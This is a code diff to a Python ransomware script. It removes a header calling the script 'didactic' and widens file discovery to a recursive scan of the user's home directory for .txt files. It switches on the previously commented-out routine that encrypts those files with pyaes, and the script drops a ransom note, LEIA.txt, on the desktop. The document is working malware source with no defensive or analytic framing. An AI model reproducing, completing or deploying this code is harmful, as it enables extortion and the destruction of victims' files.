@@ -1,20 +1,47 @@
-"""
-Ransomware - 0.0.0.0
-
-By Carlos Henrique Barros Silva Campos
-
-OBS: Script para total didática.
-"""
 import os
 import glob
 import time
 import pyaes
 from pathlib import Path
-#a=argv[1]
-lst_arq = ["*.txt"]
-lst_past = []
+filename_filter = ["*.txt"]
+
+
+
+base_path=Path.home()
+y = Path.home() / "Desktop"
+os.chdir(y)
 print('Criptografando')
 time.sleep(3)
+
+def revert(var):
+    c=int(len(var)-1)
+    msg=''
+    for i in var:
+        msg=msg+var[c]
+        c=c-1
+    return msg
+def form(var):
+    var=var.__str__()
+    c=int(len(var)-1)
+    o=r"\ ".replace(" ","")
+    msg=''
+    for g in var:
+        if var[c]==o:
+            break
+        else:
+            msg=msg+var[c]
+        c=c-1
+    msg=revert(msg)
+    msg=var.replace(msg, "")
+    return msg
+def varer():
+    pastas=[]
+    for t in filename_filter:
+        for filename in Path(base_path).rglob(t):
+            pastas.append(form(filename))
+    return pastas
+lst_past = varer()
+
 def txt():
     msg=open(f'{y}\\LEIA.txt','w+')
     msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
@@ -24,7 +51,7 @@ def txt():
     msg.close()
 
 def criptografando():
-    for files in lst_arq:
+    for files in filename_filter:
         for format_file in glob.glob(files):
             print(format_file)
             f = open(f'{desktop}\\{format_file}', 'rb')
@@ -49,9 +76,7 @@ for i in lst_past:
     except Exception:
         pass
     os.chdir(desktop)
-    #criptografando()
-y = Path.home() / "Desktop"
-os.chdir(y)
+    criptografando()
 txt()
 h=9
 while h<10:
